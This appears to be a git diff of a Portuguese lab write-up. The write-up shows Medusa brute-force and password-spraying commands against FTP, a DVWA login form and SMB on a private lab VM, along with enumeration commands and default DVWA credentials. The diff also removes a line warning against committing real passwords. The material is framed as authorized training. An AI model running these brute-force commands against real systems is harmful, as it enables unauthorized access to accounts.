@@ -22,7 +22,7 @@ nmap -sV -p 20,21 192.168.56.102
 
 **Ataque (Medusa):**
 ```bash
-medusa -h 192.168.56.102 -U users.txt -P password.txt -M ftp -t 6 > ftp_credenciais.txt
+medusa -h 192.168.56.102 -U users.txt -P password.txt -M ftp -t 6
 ```
 
 **Validação (login manual):**
@@ -37,22 +37,21 @@ ftp 192.168.56.102
 
 ## 2) DVWA (Web) — Ataque a formulário (FORM)
 
-> Confirme o endpoint do DVWA e a string de falha antes de rodar (a flag `-m FAIL` deve corresponder ao texto exato retornado pelo formulário).
-
 **Comando (Medusa FORM):**
 ```bash
 medusa -h 192.168.56.102 -U users.txt -P password.txt \
  -M http -m FORM:POST:/dvwa/login.php \
  -m FORM-DATA:"username=^USER^&password=^PASS^&Login=Login" \
  -m FAIL:"Login failed" \
- -T 10 -t 5 > dvwa_medusa.txt
+ -T 10 -t 5
 ```
 
-**Validação:**
-- Verificar `dvwa_medusa.txt` por resultados de sucesso.
-- Acessar via navegador e confirmar redirecionamento/painel do DVWA com as credenciais encontradas.
-- Capturar tela (redigida) como evidência.
-
+**Validação (login manual):**
+```text
+# Abrir o DVWA no navegador (ex.: `http://192.168.56.102/dvwa/login.php`).
+# user: admin
+# senha: password
+```
 ---
 
 ## 3) SMB — Enumeração e Password Spraying
@@ -65,14 +64,12 @@ enum4linux -a 192.168.56.102 | tee enum4_output.txt
 
 **Ataque (Medusa — SMB):**
 ```bash
-medusa -h 192.168.56.102 -U users.txt -P password.txt -M smbnt -t 2 -T 50 > smb_medusa.txt
+medusa -h 192.168.56.102 -U users.txt -P password.txt -M smbnt -t 2 -T 50
 ```
 
 **Validação (listar shares / conectar):**
 ```bash
 smbclient -L //192.168.56.102 -U msfadmin
-# para conectar a um share:
-# smbclient //192.168.56.102/<share> -U <usuario_encontrado>
 ```
 
 ---
@@ -80,7 +77,6 @@ smbclient -L //192.168.56.102 -U msfadmin
 ## Observações rápidas de segurança e ética
 
 * Testes realizados apenas em VMs autorizadas.  
-* **Não** subir arquivos com senhas reais no GitHub. Mantenha saídas redigidas.
 
 ---
 
